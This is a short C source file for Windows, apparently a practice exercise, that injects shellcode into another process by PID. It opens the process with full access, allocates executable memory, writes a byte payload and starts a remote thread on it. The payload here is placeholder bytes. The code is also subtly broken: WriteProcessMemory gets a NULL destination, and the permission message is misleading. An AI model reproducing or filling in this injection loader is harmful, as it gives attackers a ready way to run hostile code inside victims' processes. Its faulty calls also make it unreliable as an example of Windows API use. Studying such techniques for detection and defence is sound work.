/**
 * Useful Links:
 * https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex
 * https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
 * https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
*/
#include <stdio.h>
#include <Windows.h>
#include <string.h>


const unsigned char sexProgram[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char *argv[])
{ 
    DWORD PID = NULL;
    HANDLE hProc, hThread = NULL;
    LPVOID rBuffer = NULL;
    LPDWORD threadID = NULL;

    if(argc < 2){
        puts("Usage: shellcode.exe <PROCESS_ID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    
    printf("(-) Trying to open the Process: %ld\n", PID);

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    printf("(-) Got a handle to the process --> 0x%x\n", hProc);

    if(hProc == NULL){
        DWORD err = GetLastError();
        printf("(-) Invalid Process. Could Not get handle to the process %ld.\n(-) Error: %ld\n", PID, err);
        return EXIT_FAILURE; // same as "return -1";
    }
    puts("Process Found.");

    rBuffer = VirtualAllocEx(hProc, NULL, sizeof(sexProgram), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("(-) Allocated %zu bytes with Read and Write permissions.\n", sizeof(sexProgram));

    WriteProcessMemory(hProc, NULL, sexProgram, (size_t) sizeof(sexProgram), NULL);
    printf("(-) Wrote %zu bytes to the Process Memory.\n", sizeof(sexProgram));


    hThread = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) rBuffer, NULL, 0, 0, &threadID );

    if(hThread == NULL){
        printf("(-) Unable to get the handle to the thread. Error: %ld\n", GetLastError());
        CloseHandle(hProc);
        return EXIT_FAILURE;
    }

    printf("(-) Got the handle to the thread(%ld): 0x%x\n", threadID, hThread);
    puts("(-) Cleaning up...");
    CloseHandle(hProc);
    CloseHandle(hThread);
    puts("(+) Finished.");
    
    return EXIT_SUCCESS; // same as "return 0;";
}